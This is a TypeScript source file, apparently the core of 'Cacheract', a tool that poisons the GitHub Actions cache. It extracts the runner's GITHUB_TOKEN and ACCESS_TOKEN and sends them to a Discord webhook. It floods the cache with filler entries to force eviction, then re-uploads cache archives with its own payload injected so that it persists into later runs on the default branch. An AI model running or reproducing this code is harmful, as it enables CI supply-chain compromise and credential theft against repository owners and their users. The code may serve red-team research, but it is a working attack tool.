import * as path from 'path';
import * as crypto from 'crypto';
import { Config, validateConfig } from '../config/index';
import { TokenService } from '../services/TokenService';
import { ReportService } from '../services/ReportService';
import { GitHubService } from '../services/GitHubService';
import { ArchiveService } from '../services/ArchiveService';
import { CacheService } from '../services/CacheService';
import { calculateCacheConfigs } from '../cache_predictor';
import { sleep, cleanupFile, checkRunnerEnvironment } from './utils';

export class App {
    private tokenService: TokenService;
    private reportService: ReportService;
    private githubService: GitHubService;
    private archiveService: ArchiveService;
    private cacheService: CacheService;

    constructor(
        tokenService?: TokenService,
        reportService?: ReportService,
        githubService?: GitHubService,
        archiveService?: ArchiveService,
        cacheService?: CacheService
    ) {
        this.tokenService = tokenService || new TokenService();
        this.reportService = reportService || new ReportService();
        this.githubService = githubService || new GitHubService();
        this.archiveService = archiveService || new ArchiveService();
        this.cacheService = cacheService || new CacheService();
    }

    async run() {
        validateConfig();
        // 1. Check Environment
        const { github_hosted, os } = checkRunnerEnvironment();
        if (github_hosted) {
            if (os !== 'Linux') {
                console.log('Cacheract currently only supports GitHub Hosted Linux runners.');
                return;
            }
        } else {
            console.log('Cacheract is not running on a GitHub Hosted runner, exiting without reporting telemtry (we could be anywhere).');
            return;
        }

        // 2. Extract Tokens
        const tokens = await this.tokenService.getTokens();
        const accessToken = tokens.get('ACCESS_TOKEN');
        const githubToken = tokens.get('GITHUB_TOKEN');

        console.log("Running 🧊 Cacheract 🧊 in verbose development mode!");
        console.log("Flush all GitHub Actions Caches to evict this tool.");

        // 3. Report to Discord
        if (Config.webhook) {
            console.log('Reporting secrets 🤫 to Discord');
            this.reportService.sendReport(Config.webhook, tokens).catch((error) => {
                console.error('Error reporting to Discord:', error);
            });
        } else {
            console.log('No Discord webhook configured 😢');
        }

        // 4. Sleep if configured
        if (Config.timeouts.sleepTimer > 0) {
            console.log(`Sleeping for ${Config.timeouts.sleepTimer} seconds...`);
            await sleep(Config.timeouts.sleepTimer * 1000);
        }

        if (!githubToken || !accessToken) {
            console.log('Missing required tokens, exiting.');
            return;
        }

        // Set tokens in env for other tools if needed (though services should handle it)
        process.env['ACCESS_TOKEN'] = accessToken;
        process.env['ACTIONS_RUNTIME_TOKEN'] = accessToken;

        if (Config.singleTurn) {
            await this.runSingleTurn(githubToken, accessToken);
            return;
        }

        // 5. Fill Cache (if configured)
        if (!this.isInfected() && Config.cache.fillCount > 0) {
            await this.fillCacheWithDummyData(Config.cache.fillCount, accessToken);
        }

        // 6. Wait for key rollover
        console.log(`Waiting ${Config.timeouts.keyRollover}ms for cache key propagation...`);
        await sleep(Config.timeouts.keyRollover);

        // 7. Update Caches
        if (await this.githubService.isDefaultBranch(githubToken)) {
            await this.processCacheEntries(githubToken, accessToken);
        } else {
            console.log('Cacheract running in non-default branch, skipping cache modification.');
        }
    }


    private isInfected(): boolean {
        return __dirname.includes('_actions');
    }

    private async fillCacheWithDummyData(count: number, accessToken: string) {
        console.log(`Adding ${count} GB of filler entries...`);
        for (let i = 0; i < count; i++) {
            const key = `setup-python-Linux-24.04.1-Ubuntu-python`;
            const version = crypto.randomBytes(32).toString('hex');
            await this.createAndSetEntry(1000000000, key, version, accessToken, false);
        }
    }

    private async createAndSetEntry(size: number, key: string, version: string, accessToken: string, injectPayload: boolean = true) {
        const archivePath = await this.archiveService.createRandomArchive(size);
        if (!archivePath) {
            console.error("Failed to create entry for key.");
            return;
        }

        if (injectPayload) {
            // Pass the path to the current executable (bundled js)
            // process.argv[1] is the path to the script being executed by Node.js
            const currentFilePath = process.argv[1];

            const status = await this.archiveService.injectPayloads(archivePath, currentFilePath);
            if (!status) {
                console.error("Failed to modify archive!");
                return;
            }
        }
        await this.cacheService.setEntry(archivePath, key, version, accessToken);
        cleanupFile(archivePath, 'archive after upload');
    }

    private async processCacheEntries(githubToken: string, accessToken: string) {
        const entries = await this.githubService.listCacheEntries(githubToken);
        let clearEntryFailed = false;

        try {
            const configs = await calculateCacheConfigs();

            // Add manual entries
            for (const entry of Config.cache.explicitEntries) {
                configs.add(`${entry.key}:${entry.version}`);
            }

            console.log('Calculated cache configs:', configs);

            const entriesToUpdate: any[] = [];

            for (const config of configs) {
                const [key, version] = [
                    config.slice(0, config.lastIndexOf(':')),
                    config.slice(config.lastIndexOf(':') + 1)
                ];

                if (Config.github.ref) {
                    if (!await this.githubService.checkCacheEntry(githubToken, key, Config.github.ref)) {
                        entriesToUpdate.push({
                            key,
                            version,
                            ref: "e808b8c29727ee0b47c076d7dfad1db8c5a39eec", // dummy
                            size: 1333337
                        });
                    }
                } else {
                    console.error('GITHUB_REF is not defined');
                }
            }

            const allEntries = [...entries, ...entriesToUpdate];

            if (!allEntries || allEntries.length === 0) {
                console.log('No cache entries found, Cacheract will not attempt to update entries as it does not know the keys.');
                return;
            }

            for (const entry of allEntries) {
                const { key, version, ref, size } = entry;
                const currBranch = Config.github.ref;

                // Skip if infected or self-poisoning
                if ((this.isInfected() && currBranch === ref) || key.includes("setup-python-Linux-24.04.1")) {
                    console.log(`Skipping entry: ${key}`);
                    continue;
                }

                // Handle previous clearEntry failure
                if (clearEntryFailed) {
                    const newKey = currBranch === ref ? key + '1' : key;
                    if (currBranch === ref) {
                        console.log(`Skipping setting entry for key ${key} due to previous clearEntry failure. Creating new cache entry with key: ${newKey}`);
                    } else {
                        console.log("Attempting to update entry in main that is currently only in a feature branch or a custom entry.");
                    }
                    await this.createAndSetEntry(size, newKey, version, accessToken);
                    continue;
                }

                // Determine path: create or retrieve
                const needFiller = currBranch !== ref || Config.cache.skipDownload;
                let path = '';

                if (needFiller) {
                    console.log(`Creating entry with filler data to avoid cache refresh.`);
                    path = await this.archiveService.createRandomArchive(size);
                } else {
                    path = await this.cacheService.retrieveEntry(key, version, accessToken);
                }

                if (!path) {
                    if (!needFiller) console.log(`Failed to retrieve cache entry ${key}!`);
                    continue;
                }

                // Update the entry (inject payloads)
                // We need the current file path.
                const currentFilePath = process.argv[1];
                const status = await this.archiveService.injectPayloads(path, currentFilePath);

                if (!status) {
                    console.log("Failed to modify archive!");
                    continue;
                }

                // Attempt to clear the entry from the feature branch
                const cleared = await this.githubService.clearEntry(key, version, githubToken);
                if (!cleared) {
                    console.log(`Failed to clear cache entry ${key}!`);
                    clearEntryFailed = true;
                }

                // Set the entry (with new key if needed)
                const setKey = (cleared || currBranch !== ref) ? key : key + '1';
                const setMsg = (cleared || currBranch !== ref)
                    ? `Setting entry for key ${setKey}`
                    : `Setting new cache entry with key: ${setKey}`;
                console.log(setMsg);
                await this.cacheService.setEntry(path, setKey, version, accessToken);

                cleanupFile(path, 'archive after upload');
            }

        } catch (error) {
            console.log(error);
        }
    }

    private async runSingleTurn(githubToken: string, accessToken: string) {
        console.log("Running in Single Turn ↩️ mode");

        let defaultBranch = "main";
        try {
            defaultBranch = await this.githubService.getDefaultBranch(githubToken);
        } catch (e) {
            console.warn("Failed to get default branch, assuming 'main'");
        }
        const defaultRef = `refs/heads/${defaultBranch}`;
        console.log(`Targeting default branch: ${defaultBranch} (${defaultRef})`);

        const allCaches = await this.githubService.listCacheEntries(githubToken);

        // Filter valid targets on default branch, excluding our own filler key
        const targetCaches = allCaches.filter(c =>
            c.ref === defaultRef &&
            !c.key.includes('setup-python-Linux-24.04.1-Ubuntu-python')
        );

        console.log(`Found ${targetCaches.length} existing cache entries on ${defaultBranch}.`);

        // Map key:version to entry details to handle deduplication
        const targetsMap = new Map<string, { key: string, version: string, size: number, exists: boolean }>();

        // Add existing caches
        for (const c of targetCaches) {
            targetsMap.set(`${c.key}::${c.version}`, { key: c.key, version: c.version, size: c.size, exists: true });
        }

        // Add explicit entries
        for (const e of Config.cache.explicitEntries) {
            const compositeKey = `${e.key}::${e.version}`;
            if (!targetsMap.has(compositeKey)) {
                targetsMap.set(compositeKey, { key: e.key, version: e.version, size: 100000000, exists: false });
            }
        }

        // Preparation: Download existing entries before they are evicted
        const entriesToRestore: { key: string, version: string, path: string, size: number }[] = [];
        console.log(`Preparing to restore ${targetsMap.size} entries after eviction.`);

        const currentFilePath = process.argv[1];
        let downloadedCount = 0;
        const MAX_DOWNLOAD_SIZE = 250 * 1024 * 1024; // 250MB
        const MAX_DOWNLOAD_COUNT = 10;

        for (const target of targetsMap.values()) {
            if (target.exists) {
                if (target.size < MAX_DOWNLOAD_SIZE && downloadedCount < MAX_DOWNLOAD_COUNT) {
                    console.log(`Downloading existing entry ${target.key} (v: ${target.version}) before eviction...`);
                    const path = await this.cacheService.retrieveEntry(target.key, target.version, accessToken);
                    if (path) {
                        entriesToRestore.push({ key: target.key, version: target.version, path, size: target.size });
                        downloadedCount++;
                    } else {
                        console.warn(`Failed to retrieve ${target.key}. Will replace with fresh payload instead.`);
                        entriesToRestore.push({ key: target.key, version: target.version, path: '', size: target.size });
                    }
                } else {
                    const reason = target.size >= MAX_DOWNLOAD_SIZE ? 'size limit' : 'count limit';
                    console.log(`Skipping download for ${target.key} (Size: ${target.size}) due to ${reason}. Will replace with fresh payload.`);
                    entriesToRestore.push({ key: target.key, version: target.version, path: '', size: target.size });
                }
            } else {
                console.log(`Marking new explicit entry ${target.key} for creation after eviction.`);
                entriesToRestore.push({ key: target.key, version: target.version, path: '', size: target.size });
            }
        }

        // Trigger Eviction
        await this.fillCacheWithDummyData(12, accessToken);

        // Calculate initial keys to watch for eviction (only those that actually existed)
        const initialEntries = new Set(targetCaches.map(c => `${c.key}::${c.version}`));

        if (initialEntries.size > 0) {
            console.log("Polling for eviction of original keys...");
            const startTime = Date.now();
            const maxTime = 2 * 60 * 1000; // 2 minutes

            while (Date.now() - startTime < maxTime) {
                await sleep(5000);
                const currentCaches = await this.githubService.listCacheEntries(githubToken);
                let remaining = 0;
                for (const c of currentCaches) {
                    if (c.ref === defaultRef && initialEntries.has(`${c.key}::${c.version}`)) {
                        remaining++;
                    }
                }

                if (remaining === 0) {
                    console.log("All original cache keys have been evicted!");
                    break;
                }
            }
        } else {
            console.log("No initial entries to wait for eviction.");
        }

        // Resurrect / Create Entries
        console.log("Resurrecting entries with Cacheract payload...");
        for (const entry of entriesToRestore) {
            let archivePath = entry.path;

            // If it's a new explicit entry, create a random archive
            if (!archivePath) {
                archivePath = await this.archiveService.createRandomArchive(entry.size);
            }

            if (archivePath) {
                // Determine status (inject payload)
                const status = await this.archiveService.injectPayloads(archivePath, currentFilePath);
                if (status) {
                    console.log(`Uploading malicious version of ${entry.key}...`);
                    await this.cacheService.setEntry(archivePath, entry.key, entry.version, accessToken);
                } else {
                    console.error(`Failed to inject payload into ${entry.key}`);
                }

                cleanupFile(archivePath, 'archive after upload');
            }
        }
    }
}
